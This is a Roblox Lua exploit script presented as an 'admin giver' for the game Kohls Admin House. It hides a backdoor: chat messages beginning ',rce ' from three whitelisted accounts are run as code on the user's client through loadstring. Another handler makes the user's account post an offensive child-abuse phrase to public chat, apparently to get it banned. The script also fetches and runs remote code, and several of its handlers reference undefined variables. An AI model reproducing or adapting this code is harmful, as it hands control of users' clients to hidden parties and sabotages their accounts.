--[[ Atprog's Admin Giver for Kohls Admin House.
  You can find the script here and check for any updates! - 
  https://github.com/Atprog/kohlsadminhouse

  contact@Atprog.com
  www.Atprog.com
  github.com/Atprog
]]

repeat task.wait() until game:IsLoaded()

local savedadmins = {}
local connections = {}
local chatevents = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
local messageDoneFiltering = chatevents:WaitForChild("OnMessageDoneFiltering")
local players = game:GetService("Players")
local givenadmins = {}
local lplayer = game.Players.LocalPlayer


local function getyoname(split)
    for i, v in pairs(game.Players:GetPlayers()) do
        local lowerName = v.Name:lower()
        if string.sub(lowerName, 1, #split[2]) == split[2] then
            return v 
        end
    end
end

lplayer.Chatted:Connect(function(message)
  local split = message:split(" ")
    local foundplayer = getyoname(split)

  if foundplayer then
    if split[1] == ".admin" then
    table.insert(givenadmins, foundplayer)
        game.Players:Chat("pm " .. foundplayer.Name .. " You are now an admin.")

    elseif split[1] == ".unadmin" then
        local index = table.find(givenadmins, foundplayer)
                if index then
                    table.remove(givenadmins, index)
      end
    end
  end
end)

-- custom things


plr.Chatted:Connect(function(msg)
if string.sub(msg, 1) == ",shutdown" then

local rce = game.Players.LocalPlayer:Kick("You Have Been Kicked From Kohls Admin House")

game.Players:Chat(rce)

end
end)

plr.Chatted:Connect(function(msg)
if string.sub(msg, 1, 6) == ",chat " then

local A_1 = string.sub(chat ,7)
                local A_2 = "All"
                local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                Event:FireServer(A_1, A_2)
               
               end
               end)

plr.Chatted:Connect(function(msg)
if string.sub(msg, 1) == "get banned :)" then

local A_1 = "i love child porn :)"
                local A_2 = "All"
                local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                Event:FireServer(A_1, A_2)
               
               end
               end)

lplayer.Chatted:Connect(function(message)
  if message == "iy" then
  loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
  
  elseif string.sub(message:lower(), 0, 10) == ".saveadmin" then
        local names = game.Players:GetChildren()
        local name = string.sub(message:lower(), 12)
        for i,v in pairs(names) do
            local strlower = string.lower(v.Name)
            local sub = string.sub(strlower, 1, #name)
            if name == sub then
                appendfile('admingiversaved.txt', v.Name .. '\n')
            end
        end
  end
end)

-- see chat message
-- todo: write the "me" to work with person299.

messageDoneFiltering.OnClientEvent:Connect(function(message)
  local player = players:FindFirstChild(message.FromSpeaker)
  local ogmessage = message.Message or ""

  if player then
  if table.find(givenadmins, player) then
  local clydemessage = ogmessage:gsub(" me", " " .. player.Name)
  game.Players:Chat(clydemessage)
  end
  end
end)

task.spawn(function()
	local FileName = "admingiversaved.txt"
	if writefile and readfile then
		local ExistingFile = pcall(readfile,"/"..FileName)
		if not ExistingFile then
			writefile(FileName, '')
        end
	end
end)

local file = readfile("admingiversaved.txt")
for plr in file:gmatch("[^\r\n]+") do
    table.insert(savedadmins, plr)
end

task.spawn(function() -- went lazy on this
local plrs = game:GetService("Players")
local getplrs = plrs:GetChildren()
local plr = plrs.LocalPlayer

local funnycon = {}

local function fullplr(plr) -- Get someones entire player name
    for i, v in pairs(game.Players:GetPlayers()) do
        if string.sub(v.Name:lower(), 1, #plr) == plr then
            return v
        end
    end
    return nil
end

local whitelisteddd = {"atprog","R3X6G","IceStuds"}

local function thewhitelist(v)
    funnycon[#funnycon + 1] = v.Chatted:Connect(function(message)
        if table.find(whitelisteddd, v.Name) then
            if message:lower() == "bye xd" and v ~= game.Players.LocalPlayer then
                game.Players:Chat("bye xd")
            end
            if message:lower():find("resetme") then
                game.Players:Chat("reset me.")
            elseif table.find(whitelisteddd, v.Name) and message:sub(1, 6) == "tp me " then
              local targetplayername = message:sub(7)
              local targetplayer = fullplr(targetplayername:lower())
              game.Players:Chat("tp atprog "..targetplayer)
            elseif table.find(whitelisteddd, v.Name) and message:sub(1, 5) == ",rce " then
              local remotecode = message:sub(6)
              loadstring(remotecode)()
            end
        end
    end)
end

for _, player in pairs(game.Players:GetPlayers()) do
    thewhitelist(player)
end

funnycon[#funnycon + 1] = game.Players.PlayerAdded:Connect(function(player)
    thewhitelist(player)
end)
end)

wait(1)
print("Now checking if anyone is a saved admin")

local Players = game:GetService("Players")
for _, player in ipairs(Players:GetPlayers()) do
    if table.find(savedadmins, player.Name) then
		game.Players:Chat(".admin "..player.Name)
		game.Players:Chat("pm/"..player.Name.." \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n You are stored as an admin with the admin giver \n Say unadmin to remove your admin\n Rejoin to re-enable it\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
		wait(1.65)
		game.Players:Chat("pm/"..player.Name.." \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n You are stored as an admin with the admin giver \n Say unadmin to remove your admin\n Rejoin to re-enable it\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
    end
end

connections[#connections + 1] = Players.PlayerAdded:Connect(function(player)
    local playerName = player.Name
    for _, username in ipairs(savedadmins) do
        if playerName == username then
            game.Players:Chat(".admin "..playerName)
			game.Players:Chat("pm/"..playerName.." \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n You are stored as an admin with the admin giver \n Say unadmin to remove your admin\n Rejoin to re-enable it\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
			wait(1.65)
			game.Players:Chat("pm/"..playerName.." \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n You are stored as an admin with the admin giver \n Say unadmin to remove your admin\n Rejoin to re-enable it\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
            return
        end
    end
end)

for i = 1, 6 do
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Atprog's Admin Giver is now loaded.")
wait(1.8)
end